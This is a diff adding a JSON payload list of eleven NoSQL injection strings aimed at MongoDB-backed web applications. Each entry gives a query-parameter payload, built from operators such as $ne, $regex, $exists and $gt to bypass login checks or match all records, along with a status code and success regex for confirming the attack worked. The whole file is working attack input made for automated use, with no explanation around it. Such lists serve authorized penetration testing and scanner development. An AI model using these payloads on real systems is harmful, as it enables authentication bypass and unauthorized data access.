@@ -1,0 +1,123 @@
+[
+  {
+    "payload_id": "OWP-0590",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$ne]=none&pass[$ne]=none",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0591",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$regex]=ad.*&password[$regex]=.*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0592",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$eq]=admin&password[$exists]=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0593",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$nin][]=admin&password[$ne]=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0594",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[$gt]=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-1315",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$ne]=null",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1316",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?pass[$ne]=null",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1317",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?user[$exists]=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1318",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?id[$gt]=0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1319",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?search[$regex]=.*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  },
+  {
+    "payload_id": "OWP-1320",
+    "vulnerability_category": "Injection (NoSQLi)",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "?field[$type]=string",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin"
+    }
+  }
+]
